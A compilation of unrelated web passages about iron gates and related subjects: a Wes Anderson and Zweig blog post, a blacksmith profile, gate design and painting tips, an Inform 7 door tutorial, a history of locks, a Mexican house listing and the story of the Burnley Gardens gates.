   <div>   <p>At , film-maker Wes Anderson discusses the influence of Stefan Zweig&#xa0;on his new movie&#xa0;&#xa0;with Zweig biographer&#xa0;George Prochnik (author of the forthcoming&#xa0;):</p>   <blockquote>    <p>There&#x2019;s a wonderful photochrom of the hotel that I always thought of as sort of the model for our hotel, which is the Hotel Pupp in Karlovy Vary, which was in Carlsbad. The thing we learned when we visited all sorts of places that we found on this collection of pictures was that none of them were enough like what they once were to work for us. But the photochrom images seemed to tap into a truth about Zweig&#x2019;s vision of the world that I was able to draw on in developing a visual aura for the film.</p>    <p>In The Post Office Girl, Zweig&#x2019;s description of the grand hotel in Switzerland is so evocative. The protagonist is a girl who works in the post office. She&#x2019;s invited to stay in this hotel as a gift from her rich aunt, and when she arrives in this place, the management thinks she&#x2019;s there to make a delivery. Her suitcase is a basket. Finally they realise she&#x2019;s actually going to be a guest in the hotel, which is unlike anywhere she&#x2019;s ever been. Her point of view about this treatment she receives, and her experience of walking in and realising, &#x201c;This is where I&#x2019;m going to sleep&#x201d;, is so powerful. But also that by the time her holiday abruptly ends, she is already addicted to this other way of life, and her existence is so dramatically changed, and a sort of desperation comes over her &#x2014; and then a connection she makes with someone who is in his own desperate state. The idea of that work being something that had been out of print for that long is sort of surreal.</p>   </blockquote>   <p>At a recent event at the New York Public Library, Anderson similarly discussed&#xa0;Zweig&#x2019;s work with&#xa0;Paul Holdengr&#xe4;ber:</p>   <p>&#xa0;</p>   <p>UK publisher Pushkin Press has recently published <em>&#xa0;</em>a selection of Zweig&#x2019;s writings that inspired Anderson. The cover illustration (pictured top) is by &#xa0;(whose covers for Alma Classics ). Pushkin have reissued a number of Zweig&#x2019;s books with covers by Burton, , and&#xa0;.</p>   <p>The movie itself was reviewed all over place the last week, but I quite enjoyed Richard Brody&#x2019;s review for :</p>   <blockquote>    <p>Perhaps more than ever, Anderson takes a joyful yet aching delight in recreating the styles of bygone days. The hotel is like a majestically confected cake on the outside and a jewel box on the inside, adorned with staff and guests whose uniforms and fashions are nuanced to the buttons, and whose behavior is self-controlled to the glance. Yet also, more than in any of his other films, that very recreation is his subject. &#x201c;The Grand Budapest Hotel&#x201d; is about the spiritual heritage and the political force of those long-vanished styles&#x2014;about the substance of style, not just the style of his Old World characters but also, crucially, Anderson&#x2019;s own. This isn&#x2019;t Anderson&#x2019;s most personal film, in the strict sense, but it is, alongside &#x201c;The Life Aquatic with Steve Zissou,&#x201d; his most reflexive one&#x2014;even more so because the new film exposes the inner workings not just of his practice of filmmaking but of his sensibility.</p>   </blockquote>   <p><strong>UPDATE:</strong>&#xa0; talks to the film&#x2019;s lead graphic designer Annie Atkins about her work:</p>   <blockquote>    <p>We actually used comparatively few typefaces in the movie, as most lettering was created by hand. Wes and Adam had been on location recces all around Eastern Europe and had references of all kinds of hand-made signage from the last 100 years or so. The beautiful thing about period filmmaking is that you&#x2019;re creating graphic <b>design</b> for a time before graphic designers existed, per s&#xe9;. It was really the craftsmen who were the designers: the blacksmith designed the lettering in the cast <b>iron</b> <b>gates</b>; the glazier sculpted the lettering in the stained glass; the sign-painter drew the lettering for the shopfronts; the printer chose the type blocks for the stationery&#x2026;</p>    <p>&#x2026;&#xa0;My absolute favourite piece is the book itself that opens the story. It&#x2019;s a modern pink hardback with a drawing of the hotel on the front, and the name of the movie as the hotel sign. It&#x2019;s a relatively simple piece, but it&#x2019;s really special having a prop that you made with the movie&#x2019;s name on it like that. I remember Wes had sent me a quick sketch showing his idea for the book, and I really loved being able to help make that work for him. I treasure that piece, actually &#x2013; we made three for the shoot, in case one got dropped in the snow, and so I brought one home with me.</p>   </blockquote>   <h3>Similar Posts:</h3>   <ul>    <li>, March 17, 2014</li>    <li>, April 9, 2014</li>    <li>, March 2, 2015</li>   </ul>   <footer>    <p> Categories: , | Tags: , , , | </p>   </footer>   </div>  
   <div>   <div>    <p>photography by ADAM EWING</p>   </div>   <p>HUNTLY, VIRGINIA<strong> &#x2013;</strong>&#xa0;Nol Putnam forges wind from iron, his hammer&#xa0;metronomic at 2&#xbd; strikes a second, steel against iron against anvil. The angle of the peen and the force of his follow-through shape hot metal the way a rolling pin pushes pastry.</p>   <p>Putnam, 80, has been creating art from iron for more than 40 years. His hands are strong, his shoulders broad, his hearing damaged by the clang and the clatter. Flying sparks have burned constellations into his beret and shards of metal have scarred his skin, yet he awakens each day excited to return to his fire.</p>   <p>Hot like this, the crystalline molecules of the metal slide past one another and re-form under Putnam&#x2019;s tools as delicate petals and leaves, or as soaring swoops and swirls that cantilever out over broad bases. In the sculpture garden outside his White Oak Forge in Huntly, Virginia, 90 minutes north of Charlottesville on rollercoaster roads, the 7-foot-tall&#xa0;<em>West Three Wind</em>&#xa0;circles back on itself three times before shooting back through all three layers and off toward the distant sky. It is part of his series&#xa0;<em>Lines In Space,</em>&#xa0;some of the sculptures man-sized and some small enough to sit on a table, and all inspired by the childhood books by Thornton Burgess, whose Old Mother West Wind is depicted as lines that eddy off toward the horizon.</p>   <p>&#x201c;When you&#x2019;re doing something like that you have to worry about not just the physical engineering of how it&#x2019;s going to stand up and who&#x2019;s going to come play on it,&#x201d; Putnam says, &#x201c;but then how is that negative space or the space you&#x2019;ve defined going to look to the eye?&#x201d;</p>   <p>The sculpture weighs about 400 pounds, yet Putnam made it alone, heating the metal in his 3,000-degree forge, drawing the curves in chalk on the primitive platen table and bending the metal to meet them, then pounding it with both a mechanical air hammer and his own strength and persistence. For weeks he shaped component parts, then lay each out on blocks on his smithy floor, sometimes using a crane to manipulate them into position, sometimes welding them to the bucket of his tractor in order to keep them in place.</p>   <p><strong>Today he is working with</strong>&#xa0;pure iron imported from England &#x2013; &#x201c;like forging butter, relatively,&#x201d; he says, using tongs to hold a finger-width rod into the fire. Pure iron has a fibrous grain like that of wood, which makes it easy to stretch and bend and shape. Add a little carbon into the latticework of the iron and you create steel, a material much stronger but also more rigid, and thus harder to transform into items of delicate beauty.</p>   <p>Putnam turns a rheostat that controls a fan that blows air through the hot coals, the bellows long gone. He pushes the green coal to the edges of the fire with a toothless rake and pulls more coke toward the center. The rake was the first tool he ever made, and he uses it every day, all day, its handle smooth in his calloused palm. On the side of the forge are a pair of tongs he made himself, and a pair given to him by his mentor. There&#x2019;s a center punch, too, salvaged from the smithy of his best friend when he died half a decade back.</p>   <p>The iron glows red, itself nearing 2,200 degrees, and Putnam carries it to the anvil and begins his rhythmic pounding, each strike precise.</p>   <p>&#x201c;People come in and say, &#x2018;Oh, you&#x2019;re such an artist,&#x2019; which is very flattering,&#x201d; he says, &#x201c;but what they don&#x2019;t understand is that it&#x2019;s about 90 percent practice and only 10 percent genius. In any profession you develop the skill by practice, and that&#x2019;s what most people don&#x2019;t do.&#x201d;</p>   <p>Indeed, his former mentor would give beginners a two-by-four with an X drawn on one end, and only when they could hit the X each time with the center of their hammer were they allowed to work with iron.</p>   <p>Putnam strikes the end of the rod 43 times to bring it to a point, then&#xa0;returns it to the fire.</p>   <p>Both the building and the fire that is the heart of the building are called forges, although the building can also be called a smithy. This is Putnam&#x2019;s&#xa0;seventh, the design winnowed by him from what worked in the ones that came before. There are skylights over the anvil for natural light, and broad windows that frame birds and trees and the pond that separates his workshop from his home. The chimney rises 22 feet &#x2013; the higher the chimney, the better the draw; the better the draw, the hotter the fire. The Venturi effect pulls ash and smoke up the chimney and out of the shop. The floor is 4-inch-thick reinforced&#xa0;concrete; his pneumatic hammer sits on a massive block of wood that rests on its own 4-foot cube of concrete, set deeper than the building&#x2019;s footers so that the vibration of the machine won&#x2019;t set up a resonance that will crack the floors and 12-foot-tall walls.</p>   <p>The beam-mounted crane is 2 feet higher still, giving Putnam room to manipulate long lengths of iron without bashing lights or banging the&#xa0;ceiling. Hundreds of hammers hang next to the forge, the handles of his favorites smooth from use. Nearby are racks of U-shaped forms, some narrow, some wide, designed sometime along the 3,000-year history of man&#x2019;s manipulation of metal. The bottom half of the form is designed to fit into a slot in the anvil; the upper form has a hole for a handle like a hammer&#x2019;s. In a two-person shop the upper form is held by the blacksmith while an apprentice strikes it from above, squeezing and shaping the hot metal inch by inch. In Putnam&#x2019;s shop the striking is done by his pneumatic hammer &#x2013; his mechanical apprentice &#x2013; a machine so brutish it can crush metal, yet with Putnam&#x2019;s trained toes on the air pressure level is gentle enough to close a matchbox without crushing a corner.</p>   <p>Putnam pulls the red metal again from the fire and aligns it under the head of the massive air hammer. Pound after pound it flattens the metal into a lozenge, a flat lollipop on its way to becoming a leaf, its color fading from orange to gray.</p>   <p>&#x201c;This is where it&#x2019;s dangerous,&#x201d; he says, holding the back of his hand over the piece to confirm. The color is gone but the temperature still hovers at about 1,000 degrees. He sticks the metal back into the fire.</p>   <div>    <p>photography by ADAM EWING</p>   </div>   <p>Nol Putnam grew up on a farm,&#xa0;working with his hands. He adored three-dimensional geometry, and lived a life rich with books and&#xa0;music. He became a teacher of&#xa0;history and the creator of cultural bridges between incoming Native American students and the faculty of a western Massachusetts boarding school. He was in his late 30s when he read a library book on blacksmithing and used it and his dad&#x2019;s hammer &#x2013; plus a lot of self-described stubbornness &#x2013; to begin his new career. In his first decade he paid his dues making hooks and andirons and fireplace tools, then standing in heat and rain and cold at craft fairs, peddling his wares.</p>   <p>In the next decade he turned his tools to architectural and structural work &#x2013; balconies and railings and ornate iron gates of steel and copper and brass. The ideas come to him in dreams, fully formed; his job then is to awaken and capture them onto bedside paper and then to translate those sketches into something clients can understand.</p>   <p>For the Rockefeller family he forged brass into a 16-foot-wide gate adorned with a delicate tree. For what he called his &#x201c;Rousseau Gate&#x201d; he created nine leaves, 3 and 5 and 8 feet tall. For each commission he visits the site, talks with the clients about their vision, then returns later with two sketches. He could make more, but the conversations would then be complicated.</p>   <p>&#x201c;I encourage clients to mark up the drawings, to say yea and nay, to tell me what they like and don&#x2019;t,&#x201d; he says. &#x201c;I don&#x2019;t like commission work to simply be an exchange of money. I prefer for the clients to be part of the process, even to the point of coming down and taking a ceremonial whack just to see what it&#x2019;s like. Then the whole piece becomes more meaningful for everybody.&#x201d;</p>   <p>Now he pulls the flat leaf from the fire and draws a mental line down its center, then hammers on one side of it and then the other.</p>   <p>&#x201c;See the line down the middle?&#x201d; he says. &#x201c;Now I&#x2019;m going to put some veins it and then whiffle it so it look like it has some life.&#x201d;</p>   <p>He returns it to the fire.</p>   <p>Putnam forged 250 petals and leaves&#xa0;of a much heavier iron for a pair of gates that hang in the National Cathedral in Washington. The ornate Folger Gate, installed in 1995, frames the entryway to the columbarium in the Chapel of St. Joseph of Arimathea. Nearby hangs Putnam&#x2019;s Brown Gate, and behind that the ashes of ambassadors and bishops, architects and musicians, but also those of Helen Keller and her caregiver, Annie Sullivan.</p>   <p>&#x201c;It&#x2019;s a beautiful building, but it&#x2019;s a little overwhelming to think about being there,&#x201d; he says.</p>   <p>He got the job through word of mouth, and&#xa0;began work with nothing more than a handshake. For the next year and a half he worked &#x2013; 1,200 hours of forming flowers and forging the frame. The pistil on each flower and the rivets that connect the crosspieces are all different; one depicts the face of Yoda from&#xa0;<em>Star Wars</em>.</p>   <p>The gates had to meet specifications for how they hung in the arched entryway, and they had to open and close, and latch smoothly. Beyond those parameters Putnam was free to design to his own vision.</p>   <p>&#x201c;I was just really fortunate &#x2013; that I was given the chance and that I could rise to the occasion,&#x201d; he says. &#x201c;Fortunately, I think it&#x2019;s some of the best work I ever did.&#x201d; The gates are considered to be part of the fabric of the building, the things that give life to the structure: the stone carvings, the windows, the tapestries, the ironwork &#x2013; everything that gives it texture.</p>   <p>He was hired by Canon Richard T. Feller, the longtime and well-known Clerk of the Works &#x2013; chief administrator in charge of all construction and artwork for the cathedral, the sixth-largest in the world.</p>   <p>&#x201c;He was a serious man who took his work very seriously and demanded that everybody else do the same,&#x201d; Putnam says. &#x201c;It made him sometimes difficult to work with. I didn&#x2019;t particularly have a problem with it, but he held your nose to the grindstone in order to get your best work, and it was a valuable lesson.&#x201d;</p>   <p>In the midst of that work, another office of the cathedral called. Former President Gerald Ford was ill, and if he died he would come to the cathedral to lie in state, yet all the cathedral owned were four &#x201c;tacky, wobbly wooden candlesticks,&#x201d; Putnam says. &#x201c;They called me up, desperate, and said, &#x2018;Please please, we need this immediately!&#x2019; &#x201d;</p>   <p>There are few emergencies in artisanal blacksmithing, nor can things easily be rushed. Luckily, President Ford did not die at that time, but the candlesticks, tall and simple and reflective of some of the patterns in the stonework, still stand sentinel.</p>   <p><strong>Putnam pulls the leaf from the fire</strong>&#xa0;and holds it on the forward-pointing cone of the anvil. He taps the metal with his hammer, twisting the leaf until it looks blown by the wind. Then he positions a chisel-like hardy upright in the tool slot of the anvil, lays the leaf&#x2019;s stem across the hardy&#x2019;s edge and takes four solid whacks, slicing nearly through the stem. It is poor form, he says, to cut all the way through and send the hot metal shooting across the shop. Years ago a piece broke loose and whacked him on the head and knocked him out cold.</p>   <p>He clamps the leaf to a workbench and uses a screaming electric grinder to blunt the sharp edge, then holds the leaf and a stamp of his initials under the head of a foot-powered hammer &#x2013; a tool invented in Michelangelo&#x2019;s day &#x2013; and stomps, impressing his initials into the stem, then buffs the leaf with a spinning wheel of wire bristles. Last, he paints it with his homemade elixir of turpentine, linseed oil and beeswax, and buffs it dry.</p>   <p>&#x201c;Now imagine doing all those steps to every component of the cathedral gate,&#x201d; he says, as he holds up the completed leaf.</p>   <p>&#x201c;Patience is a virtue,&#x201d; he says, his voice as&#xa0;cadenced as his hammer, &#x201c;seldom in a woman &#x2026; never in a man &#x2026; but always in a blacksmith.&#x201d;</p>   <p><em>inally published in&#xa0;,&#xa0;May 10, 2014</em></p>  </div>

Alternatively, consider a custom iron gate with a picture worked into the design. Another option is a sculptural iron gate made of mixed materials such as wood and steel. Manufacturers can even create a gate that looks like bubbles, fire or some other natural substance &#x2013; let your imagination guide you.</p>   <p><strong>Gate Makeover</strong></p>   <p>Another way to customize your garden gate is by giving a basic model a makeover. suggests starting with a basic wooden gate and painting it. You can have it painted a bold color or ask for a faux painting technique that makes it look old or mossy. Likewise, change out the hardware to conform with your vision. Replace new hardware with antique models, or go ornate.</p>   <p><strong>Trellis Topper</strong></p>   <p>In the same vein, contractors often use trellis panels to make over a basic wooden gate. You could start with a rectangular model and have a geometric panel added on top for a modern appeal. Or have a full circle trellis added to the top. For a more classic look, start with an arched wooden gate, and add a panel that echoes this shape. The trellis panel can even be in wrought iron, which offers a charming complementary profile.</p>   <p><strong>Geometric Gate</strong></p>   <p>Speaking of geometry, if you have a contemporary home, consider a gate with geometric style. Imagine a rectangular gate with a large circle built into the center. The circle can feature a series of squares that echo a panel on top. The construction can be an update on basic wrought iron. Peruse your contractor&#x2019;s catalog for options, or customize a gate with the geometry that complements the fa&#xe7;ade of your home.</p>   <p><strong>Romantic Arbor</strong></p>   <p>If your front gate opens right into a garden, a romantic arbor is an excellent addition. This works well with either a picket or iron gate. Have the arbor built over the gate, and plant climbing flowers at the base to grow over the top. Flowers such as morning glory offer a delicate look, while bougainvillea creates more privacy.</p>   <p>Let your customized front gate serve as the transition between the street and your home.

   <article>   <p><span><strong><span>Doors </span></strong><span>Doors can be integral elements of IF and dealing with locked doors are standard puzzles. Creating doors in IF takes some extra work, thinking, and coding since they behave differently than other objects in Inform 7. Doors are unique in that they have two sides and connect two rooms. For now, think of a door in IF as another room that connects two other rooms.</span></span></p>   <p><span>Doors can also have the following properties:</span></p>   <p><span>they can be <b>open </b>(it is open to start),</span> <span> they can be <b>closed </b>(it is closed to start &#x2013; this is the default), </span> <span> they can be <b>locked </b>(it is locked to start), </span> <span> and they can be <b>lockable </b>(it is unlocked to start but can be locked).</span></p>   <p><span>Here is how we code a door in IF:</span></p>   <div>    <span>The iron gate is a <b>door</b>. <b>It is east of the Sidewalk and west of the Front Porch.</b></span>   </div>   <div>    <span>. </span>   </div>   <div>    <span>A door is created by establishing its relationship between two existing rooms which by default also establishes its location.</span>   </div>   <div>    <span>&#xa0;</span>   </div>   <div>    <div>     <span>Let&#x2019;s create the two adjacent rooms to complete the map:</span>    </div>    <div>     <span>The iron gate is a door.

This is usually undesirable since the mention of the door provides no information as to which direction the door leads to. The solution to this is make the door scenery (so it will not be mentioned separately) and to mention the door in both of the room descriptions (so the player knows it is there.)</span>     </div>     <div>      <span>The iron gate is a door. <b>It is scenery. </b>It is east of the Sidewalk and west of the Front Porch.</span>     </div>     <div>      <span>The Sidewalk is a room. &#x201c;This is the sidewalk in front of the house you grew up in.

   <div>   <p>Keys and locks have been used by man for thousands of years. They&#x2019;re frequently mentioned in mythology and in the Bible. In fact, in , there&#x2019;s a reference to ancient gates being repaired in Jerusalem. In those days, the locks were huge and crude and were made of wood. However, they worked and served the same purpose as today&#x2019;s mechanisms.</p>   <p>When metalworkers and locksmiths gained more expertise in their trade, they started to make locks that were used by churches, cathedrals and royal courts in Europe. They created beautiful pieces of art, which regularly included religious motifs. (See this interesting historical tidbit from <em>A Gazetteer of Lock and Key</em> Makers:&#xa0;)</p>   <p>The oldest version of a mechanical lock was found in the ruins of a palace in Nineveh. This was widely used in Egypt, and is now commonly known as the . It used a crossbar attached to a pair of surface mounts that was entirely enclosed except for a tiny keyhole.&#xa0; It&#x2019;s considered to be the predecessor of the modern styles of locks we use today.</p>   <p>The Greeks had one&#xa0;that functioned by fastening the staple and wooden bolt to the inside of a door. A sickle-shaped wooden or iron key manipulated and lifted the bolt. Compared to the one made by Romans, this one&#xa0;offered little security.</p>   <p>The first metal lock was made by the Romans and was based on the principles of the Egyptian model. The Romans designed pins of different shapes with keyholes and keys. Many of these keys were sophisticated designs, such as flowers and birds. They also invented which, with alterations, are still being used today. Wards refer to projections near the keyhole, which prevent the turning of the mechanism&#xa0;when the wrong key is used. Romans also designed miniature keys that were worn as rings. All in all, these devices&#xa0;were pretty easy to choose.</p>   <p>In the 14th and 15th century, there were some considerable improvements in the locksmith industry but the designs and decorations didn&#x2019;t develop significantly. In that period, craftsmen excelled in metal work and in the design and production of fasteners, latches and devices&#xa0;for boxes, closets, doors and gates.</p>   <p>A lock that was considered a piece of art was not used for securing&#xa0;a door. It was specially designed and produced by a skilled locksmith or an iron tradesman to test his expertise and ability to create&#xa0;it. These types of latches&#xa0;were frequently displayed, and weren&#x2019;t covered so that people could see how they worked, the components of their mechanism, and their beautiful design.</p>   <p>At the beginning of World War II, in the 1940s, locksmiths were in great demand. Those working in the field during this era didn&#x2019;t get time to practice their trade, but primarily focused on the war. Some professionals&#xa0;continued to practice and many others were recruited into service.</p>   <p>Fast forward to today: Locksmiths learn their trade in many educational institutions and engineering departments all over the world. The best way to learn the trade&#xa0;in our area&#xa0;is to take offline and online courses, although you can start as an apprentice for a local company&#xa0;and learn while working. If you want to become a &#xa0;or any other town in the region, enroll for a training program online or at any of the&#xa0;vocational schools in TN.</p>   <p>Today, a Franklin professional&#xa0; on a certain skill (such as designing or working only on vehicles or working for a car company), works from his business premises (often working with door-related hardware, like frame repairs, closers, hinges, electric strikes, etc.), works as a security consultant, works for security institutions (such as designing and creating devices&#xa0;that guard against break-ins or theft), or works for investigation institutions (as a forensic locksmith).</p>   <p>See also: &#xa0;| </p>  </div>  
   <div>   <p>Wrought iron gates are beautiful as they are usually painted in at least two colours, with the colours intertwining to reveal threads of gold or silver amidst another bold colour. If you just look around on a site like , you will concur.&#xa0;However, just like any other object exposed to rain and shine, wrought iron gates are not spared from the elements. Whenever your gate has faded, here is how you can paint it yourself:</p>   <p>1. Remove rust</p>   <p>Before you start painting, you&#x2019;ll need to remove any rust from the gate to ensure a smooth finishing. Use a wire brush or a scraper to remove rust from the gate.</p>   <p>2.&#xa0; Remove old paint</p>   <p>Without removing the existing paint, the new paint will not hold well onto the surface as well as cause unevenness. Use sandpaper of medium coarseness to remove all the chipped or peeling paint.</p>   <p>3. Wipe the gate</p>   <p>Use a dry rag to wipe the gate clean of any rust and paint debris. Alternatively, you may also use a soft brush as long as no dust accumulates on your gate.</p>   <p>4. Protect nearby items</p>   <p>Any paint job will be a messy one regardless how careful you are. Cover nearby objects, even plants, with cloth or newspapers. You may want to tape the newspapers in place bearing in mind that wind will displace the newspapers. If you are covering your plants, dampen them with a list mist of water before doing so.</p>   <p>5. Apply a coat of primer</p>   <p>Now that you are ready to start the painting works, first apply a coat of primer. This primer serves as an undercoat to minimize the rusting of the gate. Primers are available in two forms &#x2013; liquid and in aerosol cans. If there are intricate patterns on your gate, the aerosol would be more convenient or else you would find yourself wrestling with the paint brush in hard-to-reach areas. Make sure that you stir the primer well if you are using the liquid form, or shake the aerosol can well.</p>   <p>6. Let the primer dry</p>   <p>Primers usually take 1 to 3 hours to dry completely. This time may differ depending on the weather. The primer must dry completely before you start painting the gate for the best results.</p>   <p>7. Paint the gate</p>   <p>For wrought iron, use rust-inhibitive enamel paint meant for steel or metal. Using the wrong paint will cause the paint to not adhere to the surface well. Again, choose the most convenient form of paint suitable with the designs on your gate. If you are using aerosol paint, hold the can about 3-4 inches away from the gate so prevent too much paint from being sprayed and subsequently dripping and causing dried &#x2018;bumps&#x2019; of paint on your gate.</p>  </div>

   <div>   <p><em><strong>House Hunting in &#x2026; Mexico</strong></em></p>   <p>By <strong>VIRGINIA C. McGUIRE</strong></p>   <p>Local artisans took five years to build this house into a steep hillside four blocks from the town square in San Miguel de Allende, an artsy and picturesque town three hours from Mexico City. Built in the Moroccan style, it has four levels, with interconnecting hallways and staircases. An adobe structure floored in polished gray cantera stone, it is terraced down the hill from the street-facing property entrance. An antique wooden door opens to a covered walkway leading to the home, completed in 2005.</p>   <p>Off the walkway to the right, steppingstones to one of two guest suites are arranged across a pond. Directly ahead, below a round &#x201c;bull&#x2019;s eye&#x201d; window, the wooden door to the core house is bordered by carved stone. It leads into the hall that functions as the main artery.</p>   <p>Through an arched doorway off the hall to the left is a bright Mexican-style kitchen, with decorative blue tiles lining the doors and window frames. Its traditional Mexican ceiling, called a boveda, is lined with ivory-colored tile; it arcs upward to a glass cupola. The room has a double oven made by Coriat, a high-end Mexican brand, and a double stainless steel sink. The adjacent breakfast room has pale green walls and built-in cupboards. Beyond the breakfast room is the dining room, illuminated by an ornate wrought-<b>iron</b> chandelier.</p>   <p>Farther down the hall is the living room, which has a stone fireplace, cream-colored walls and three pairs of French doors leading out to a terrace. The living room connects via another hall to the master suite, which has an arched window overlooking the landscaped garden. The master bath, lined with forest green tiles, is outfitted with a bidet, a shower and a bathtub.</p>   <p>Two additional bedrooms with en-suite baths are downstairs, and a second guest suite has three bedrooms and three baths, a living room, and a kitchenette suitable for vacation rentals.</p>   <p><span><strong>to be continued</strong> </span></p>   <p>from </p>  </div>  
   <div>   <p>Wrought <b>iron</b> <b>gates</b> are beautiful as they are usually painted in at least two colours, with the colours intertwining to reveal threads of gold or silver amidst another bold colour. If you just look around on a site like , you will concur.&#xa0;However, just like any other object exposed to rain and shine, wrought <b>iron</b> <b>gates</b> are not spared from the elements. Whenever your gate has faded, here is how you can paint it yourself:</p>   <p>1. Remove rust</p>   <p>Before you start painting, you&#x2019;ll need to remove any rust from the gate to ensure a smooth finishing. Use a wire brush or a scraper to remove rust from the gate.</p>   <p>2.&#xa0; Remove old paint</p>   <p>Without removing the existing paint, the new paint will not hold well onto the surface as well as cause unevenness. Use sandpaper of medium coarseness to remove all the chipped or peeling paint.</p>   <p>3. Wipe the gate</p>   <p>Use a dry rag to wipe the gate clean of any rust and paint debris. Alternatively, you may also use a soft brush as long as no dust accumulates on your gate.</p>   <p>4. Protect nearby items</p>   <p>Any paint job will be a messy one regardless how careful you are. Cover nearby objects, even plants, with cloth or newspapers. You may want to tape the newspapers in place bearing in mind that wind will displace the newspapers. If you are covering your plants, dampen them with a list mist of water before doing so.</p>   <p>5. Apply a coat of primer</p>   <p>Now that you are ready to start the painting works, first apply a coat of primer. This primer serves as an undercoat to minimize the rusting of the gate. Primers are available in two forms &#x2013; liquid and in aerosol cans. If there are intricate patterns on your gate, the aerosol would be more convenient or else you would find yourself wrestling with the paint brush in hard-to-reach areas. Make sure that you stir the primer well if you are using the liquid form, or shake the aerosol can well.</p>   <p>6. Let the primer dry</p>   <p>Primers usually take 1 to 3 hours to dry completely. This time may differ depending on the weather. The primer must dry completely before you start painting the gate for the best results.</p>   <p>7. Paint the gate</p>   <p>For wrought <b>iron</b>, use rust-inhibitive enamel paint meant for steel or metal. Using the wrong paint will cause the paint to not adhere to the surface well. Again, choose the most convenient form of paint suitable with the designs on your gate. If you are using aerosol paint, hold the can about 3-4 inches away from the gate so prevent too much paint from being sprayed and subsequently dripping and causing dried &#x2018;bumps&#x2019; of paint on your gate.</p>  </div>

   <div>   <p>The wrought iron gates that separate the Field station from the ornamental Gardens to the west are a lasting and spectacular gift to the University of Melbourne by the Friends of Burnley Gardens.</p>   <p>Opened in 2013 as part of the 150<sup>th</sup> anniversary of the official Gardens Opening, they are the latest in a series of gates of different styles that have stood more or less in this location since the 1860s. Originally a single-opening, slightly ornate timber affair, then later a plain and functional, double-opening, chain mesh construction, the new entrance gates are now a sculptural piece of garden art.</p>   <h2><strong>Stepping back in time</strong></h2>   <p>In 1860 the land then known as the Survey Paddock was granted to the Horticultural Society for the trialling of exotic plants for the newly established Colony, on condition that a portion of the land remain open and accessible to the public. It therefore became necessary that a separate area for the proving ground be established, from which the public could be excluded. This fenced portion, at the lower east end of the area (by then re-named Richmond Park), contained numerous edible and ornamental plants, and due to the predominance of fruit trees, became known as The Orchard. A change in land use in the late 1980s from fruit tree production to horticultural research saw the area re-named The Field Station by Senior Lecturer James Hitchmough (though some still refer fondly to it as The Orchard, in memory of its historical use).</p>   <p>Coinciding with this name change, a new teaching facility (Landscape Shed) was constructed along the north-western boundary of the fenced, newly named, Field Station. Landscaping works after the building&#x2019;s completion resulted in the double chain mesh entrance gates being moved from their original position in line with the western fence line, to a new, indented, alcove position, slightly downhill from their original location.</p>   <p>The original site of the gates is historically significant because of their location at the crossroad of two paths, which were part of the original, rather formal 1860 design by Alfred Lynch. These two straight axes, one the roadway that runs in an east-west direction to the bottom of the Field Station (the former orchard or proving ground) and the other the north-south pathway that runs along the fence of the Field Station, are all that remains of Lynch&#x2019;s design. (Charles Bogue Luffmann, some thirty years later, altered the rest of Lynch&#x2019;s design to what essentially exists today. Rather than straight paths or roadways, Luffmann redesigned them to be curved and naturalistic, constructed below the level of the surrounding lawns.)</p>   <p>A conservation Management Analysis undertaken in 2002 by Carmel McPhee, which investigated the heritage significance of the entire Burnley site, recommended that the gates be put back in their original position in line with the western fence line</p>   <p>At the time, the cost of relocation, and the landscaping involved, was felt to be of a lower priority for funding than other projects that the Gardens required. Fortunately, the Friends of Burnley Gardens (FOBG) were able to assist with funding. This came about, in part, because the entrance area to the former Orchard was a component of the historical garden tours undertaken by the FOBG and the need to reposition the gates became part of the tour story.</p>   <h2><strong>A new idea takes shape.</strong></h2>   <p>Michele Adler, a Burnley lecturer and instigator and author of Burnley Garden tours in the late 1980s, was one of only a few to understand and convey the history of the soon-to-be Heritage-listed Gardens. Michele&#x2019;s close involvement with the Friends of Burnley Gardens, as a Senior Executive Committee member, among other involvements, and her enthusiasm for creating a legacy for the 150<sup>th</sup> anniversary celebrations led her to suggest that the Friends donate ornamental gates to the Gardens. She felt that the relocation of the gates provided an ideal opportunity to replace the mundane chain mesh gates with beautiful ornamental gates. This idea was endorsed by the Committee of the FOBG, and planning began.</p>   <p>Given the history of the former Orchard, and the past use in the Gardens of the fruit-tree pruning technique known as <em>espalier</em>, Michele suggested that the gates be made to represent <em>espalier</em> fruit trees. Andrew Smith, the Gardens co-ordinator and University liaison officer for the FOBG, inspired by the gates of English parklands, suggested that the top of the gates curve and rise up to meet in the middle, rather than being square and flat on top.</p>   <p>In March 2011, with the initial concept worked out, several wrought iron gate manufacturers were approached to modify their gate designs to include pieces of fruit. It soon became apparent, however, that what was really needed was a metal worker-artist, rather than a company that could modify driveway gates. A suitable gate manufacturer was found by chance while an FOBG Significant Tree bus tour was passing through Daylesford in April 2011. With most of the FOBG Committee on board, the bus passed the display shop of the <em>Overwrought </em>metal work and design business, and the intricate and original gate designs on show were immediately appealing as being suitable. The bus driver was asked to turn around, and the contact details of David Dawson were taken for later follow up. David was subsequently contacted in June 2011, and asked to travel down to Melbourne to meet with committee members of the FOBG and University staff in August 2011 to discuss the project.</p>   <h2><strong>The final design</strong></h2>   <p>The design ideas that came out of that initial meeting expanded on the original concept. David was able to accommodate and suggest ideas and solutions to all the creative input of those who attended the meeting. Michele made a sketch of these ideas and David was asked to quote on what was drawn and discussed. As the gate and post designs were unusual, with a high level of creative input needed, the committee agreed that no other companies would be asked to quote. David submitted the price of $10,450 plus GST in November 2011, and the Committee accepted the quote and asked him to proceed. The design sketch and notes from the August meeting were to be later expanded, but essentially were the same as what was finally installed.</p>   <p>The design consisted of two gates, the centre of which, when closed, would represent the trunk of a fruit tree, with each gate having horizontal &#x201c;branches&#x201d; bearing fruit that had been grown in the former Orchard. Grapes, apples, peaches and lemons were decided upon as the best representatives of the products of the old Orchard. Glenys Rose, an FOBG Committee member, suggested that the major bird species that frequent the gardens (magpie, rosella and cockatoo) could be shown perched on the espaliered branches.</p>   <p>As the gates were to be viewed from both sides, and to give a more realistic impression, the fruits and birds were designed to be three dimensional in form. David Dawson proposed that, rather than stone, the posts be made of metal, with laser cut-outs of fruit shapes on either side. Andrew put forward the idea of installing up-lights in each post, to enable the laser cut fruit shapes to be highlighted at night. Michele suggested that finials should be placed on top of each gate post, in keeping with Victorian-era gate designs. After discussion of using a fruit such as a pineapple as the finial, Michele suggested a sequoia cone be used. This had great merit, as one of the Significant trees, and some would suggest the signature tree of the Gardens, is the nearby <em>Sequoia sempervirens. </em> This tree, planted in 1861-2, is in direct line with the gates when viewed from the east side<em>.</em></p>   <p>Additional design details of the grape, apple, peach and lemon leaf and fruit sizes were given to David in February 2012. Progress pictures were sent to the committee in July 